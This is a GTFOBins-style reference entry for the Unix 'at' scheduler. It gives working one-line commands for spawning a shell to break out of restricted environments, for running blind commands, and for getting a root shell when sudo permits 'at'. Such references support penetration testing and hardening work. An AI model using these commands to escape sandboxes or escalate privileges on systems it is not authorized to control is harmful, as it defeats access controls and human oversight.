# GTFOBin: at

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

The invocation will be blind, but it is possible to redirect the output to a file in a readable location.

```
COMMAND=id
echo "$COMMAND" | at now
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
```